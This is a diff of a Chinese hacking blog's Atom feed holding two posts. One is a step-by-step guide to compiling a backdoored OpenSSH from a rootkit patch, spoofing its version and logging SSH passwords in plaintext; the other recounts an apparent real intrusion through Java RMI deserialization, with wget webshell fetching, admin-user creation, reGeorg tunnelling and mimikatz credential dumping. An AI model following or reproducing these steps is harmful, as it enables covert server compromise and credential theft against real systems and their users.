@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="OneHone.github.io/"/>
-  <updated>2018-01-29T16:33:48.530Z</updated>
+  <updated>2018-03-22T09:34:47.246Z</updated>
   <id>OneHone.github.io/</id>
   
   <author>
@@ -17,11 +17,40 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>OpenSSH后门的安装</title>
+    <link href="OneHone.github.io/2018/03/22/OpenSSH%E5%90%8E%E9%97%A8%E7%9A%84%E5%AE%89%E8%A3%85/"/>
+    <id>OneHone.github.io/2018/03/22/OpenSSH后门的安装/</id>
+    <published>2018-03-21T16:00:00.000Z</published>
+    <updated>2018-03-22T09:34:47.246Z</updated>
+    
+    <content type="html"><![CDATA[<p>本来想结合实战一起写出来的，但提权过程中出现了些问题，所以就单独写吧。</p><p>本机环境：<code>centos6.5</code> <code>OpenSSH_5.3p1</code></p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>下载<code>openssh</code>的安装包和后门安装包。<br>安装包:<code>http://www.openssh.com</code><br>后门安装包:<code>http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz</code></p><h2 id="为了伪装"><a href="#为了伪装" class="headerlink" title="为了伪装"></a>为了伪装</h2><p>在安装后门之前，先查看本机的ssh版本号<code>ssh-V</code><br><img src="/images/OpenSSH后门的安装/1.PNG" alt=""></p><h4 id="解压安装包"><a href="#解压安装包" class="headerlink" title="解压安装包"></a>解压安装包</h4><p><code>tar zxvf openssh-5.9p1.tar.gz</code><br><code>tar zxvf 0x06-openssh-5.9p1.patch.tar.gz</code><br><img src="/images/OpenSSH后门的安装/2.PNG" alt=""><br><img src="/images/OpenSSH后门的安装/3.PNG" alt=""></p><h4 id="注入后门"><a href="#注入后门" class="headerlink" title="注入后门"></a>注入后门</h4><p>将后门文件夹的<code>sshbd5.9p1.diff</code>复制到<code>openssh-5.9p1</code>文件夹中，并在该<code>openssh-5.9p1</code>文件夹执行<code>patch &lt;sshbd5.9p1.diff</code>命令<br><img src="/images/OpenSSH后门的安装/4.PNG" alt=""></p><h4 id="修改版本号和后门密码"><a href="#修改版本号和后门密码" class="headerlink" title="修改版本号和后门密码"></a>修改版本号和后门密码</h4><p>在<code>openssh-5.9p1</code>文件夹中执行<code>vim version.h</code>修改版本号（为了伪装，这里修改成一开始记下来的版本号），修改后门密码和记录密码的保存路径<code>vim includes.h</code><br><img src="/images/OpenSSH后门的安装/5.PNG" alt=""><br><img src="/images/OpenSSH后门的安装/6.PNG" alt=""><br><code>ilog</code>是记录别的机子登录本机的密码<br><code>olon</code>是记录本机登录到别的机子的密码<br>（这应该能理解吧）</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在安装之前先安装配置环境，不然会报错。<br><code>yum install -y openssl openssl-devel pam-devel</code><br><code>yum install zlib-devel</code><br><code>yum install gcc</code><br><code>yum install openssl</code><br><code>yum install openssl-devel</code></p><p>安装及编译：<br><code>./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5</code></p><p><img src="/images/OpenSSH后门的安装/7.PNG" alt=""><br>显示到这个说明编译成功，然后执行<code>make</code>和<code>make install</code>命令安装</p><h2 id="测试后门"><a href="#测试后门" class="headerlink" title="测试后门"></a>测试后门</h2><p><code>kali</code>链接<code>ssh</code><br><img src="/images/OpenSSH后门的安装/8.PNG" alt=""><br>查看登录过来的ssh密码<code>cat /tmp/ilog</code><br><img src="/images/OpenSSH后门的安装/9.PNG" alt=""><br>还是明文的<br>OK!大功告成</p><p>特别注意的是，整个过程都是在<code>root</code>用户下执行的，不然没有权限执行。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;本来想结合实战一起写出来的，但提权过程中出现了些问题，所以就单独写吧。&lt;/p&gt;
+&lt;p&gt;本机环境：&lt;code&gt;centos6.5&lt;/code&gt; &lt;code&gt;OpenSSH_5.3p1&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class
+      
+    
+    </summary>
+    
+      <category term="后门" scheme="OneHone.github.io/categories/%E5%90%8E%E9%97%A8/"/>
+    
+    
+      <category term="liunx后门" scheme="OneHone.github.io/tags/liunx%E5%90%8E%E9%97%A8/"/>
+    
+      <category term="OpenSSH" scheme="OneHone.github.io/tags/OpenSSH/"/>
+    
+  </entry>
+  
+  <entry>
     <title>JAVARMI漏洞之旅</title>
-    <link href="OneHone.github.io/2018/01/27/JAVARMI%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%97%85/"/>
-    <id>OneHone.github.io/2018/01/27/JAVARMI漏洞之旅/</id>
-    <published>2018-01-27T12:42:55.000Z</published>
-    <updated>2018-01-29T16:33:48.530Z</updated>
+    <link href="OneHone.github.io/2018/03/17/JAVARMI%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%97%85/"/>
+    <id>OneHone.github.io/2018/03/17/JAVARMI漏洞之旅/</id>
+    <published>2018-03-16T16:00:00.000Z</published>
+    <updated>2018-03-22T09:33:27.676Z</updated>
     
     <content type="html"><![CDATA[<p>博客刚搭建不久，有些美工还没做。<strong>##其实我不想在搞了，搭建个博客麻烦得要死。</strong></p><p>今天周末天气不错，兜兜转转也不懂要做什么。最近在研究RMI反序列化漏洞，就写一片文章吧。</p><h2 id="突破口"><a href="#突破口" class="headerlink" title="突破口"></a>突破口</h2><p>在一次<code>nmap</code>扫描过程中发现了目标机子8100端口存在<code>java RMI</code>服务<br><img src="/images/RMI1.PNG" alt=""><br>于是用<code>attackRMI.jar</code>链接该端口，成功回显系统信息 执行<code>cat /proc/version</code>  <code>id</code>  命令<br><img src="/images/RMI2.PNG" alt=""></p><h2 id="写马失败"><a href="#写马失败" class="headerlink" title="写马失败"></a>写马失败</h2><p><code>Liunx</code>的版本号比较低，<code>User</code>权限，<code>ifconfig</code>：10.xx.xx.13内网机子，对系统的基本信息了解之后，接下来就尝试着<code>echo</code>写一句话到<code>web</code>路径下（用菜刀连接，方便操作，因为使用<code>attackRMI.jar</code>只能在当前目录下操作，不能<code>cd</code>到别的目录），<code>echo 一句话&gt;&gt;/xxx/xxx/tomcat/webapps/root/xxx.jsp</code>（<code>web</code>路径疯狂ls才找到的） 运行完之后发现文件是创建了，但是字节为<code>0</code> 经过一番尝试之后发现<code>echo</code>命令用不了。</p><p>不能写内容到文件里去，于是想到了<code>wget</code>命令，<code>wget http://xxx.xxx.xxx/xxx.jsp -O /xxx/xxx/tomcat/webapps/root/xxx.jsp</code>（其中肉鸡的地址是<code>http</code> 马名字为<code>xxx.jsp</code>），运行后发现并没有成功写入到文件，排查原因发现该机子根本就不通外网。内网机子做了端口映射。</p><p>马儿出不了，那就翻翻有啥利用的东西。在经过疯狂的<code>ls</code>之后找到了几个数据库密码：<br><img src="/images/RMI3.PNG" alt=""></p><h2 id="转机"><a href="#转机" class="headerlink" title="转机"></a>转机</h2><p>既然突破不了，为何不去扫扫C段？果然在其同网段的一台机子的8800端口发现了同样的漏洞：<br><img src="/images/RMI4.PNG" alt=""><br>说干就干，运气不错，系统权限<br><img src="/images/RMI5.PNG" alt=""><br>windows 2008 32位 没有域<br><img src="/images/RMI6.PNG" alt=""></p><p><code>netstat -ano</code>对方开了3389<br><img src="/images/RMI7.PNG" alt=""><br>添加用户<br><code>net user admln admin /add &amp; net localgoup administrators admln /add</code><br>成功添加用户之后用<code>mstsc</code>命令远程链接发现报错：<br><img src="/images/RMI8.PNG" alt=""><br>原来该机子没有把自己的3389端口映射出来，不好的情况发生了，这台和之前的一样不能通外网，正当想办法的时候，小伙伴在该C段拿下了台<code>liunx</code>的机子，通过端口漏洞<code>jdwp</code>，过程大致说下，该漏洞是远程执行命令的，然后通过执行命令找到web服务的根路径，向其写入一句话。乌云有篇关于<code>jdwp</code>的文章，有兴趣的去看下。</p><h2 id="内网游游"><a href="#内网游游" class="headerlink" title="内网游游"></a>内网游游</h2><p>在已拿下的<code>liunx</code>机子上安装了<code>reGeorg</code>代理，然后通过代理远程链接之前的win 08机子<br><img src="/images/9.PNG" alt=""></p><p>用到<code>mimikatz</code>获取管理员的哈希及明文密码<br><img src="/images/RMI10.PNG" alt=""></p><p>之前写马失败的那台，通过<code>wget</code>到内网机子里获取到一句话,也成功拿下了。<br><img src="/images/11.PNG" alt=""></p><p>内网很大，这里就不继续写下去了。</p><p>刮好大的风啊，准备要下雨了，走人走人。</p>]]></content>
     
